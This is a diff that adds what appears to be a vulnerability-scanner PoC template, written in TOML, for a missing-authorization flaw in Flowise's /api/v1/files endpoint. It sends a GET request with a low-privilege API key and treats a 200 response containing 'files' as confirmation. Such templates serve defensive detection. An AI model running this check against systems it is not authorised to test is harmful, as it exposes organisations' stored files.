@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "验证 Flowise /api/v1/files 接口是否存在越权访问漏洞，检查低权限 API 密钥是否能列出组织内文件"
+id = "POC-AVE-2026-1335"
+name = "Flowise Missing Authorization on /api/v1/files PoC"
+severity = "high"
+tags = ["ave-2026-1335"]
+vuln_id = [
+    "CVE-2026-69252",
+    "AVE-2026-1335",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/files"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{API_KEY}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["files"]
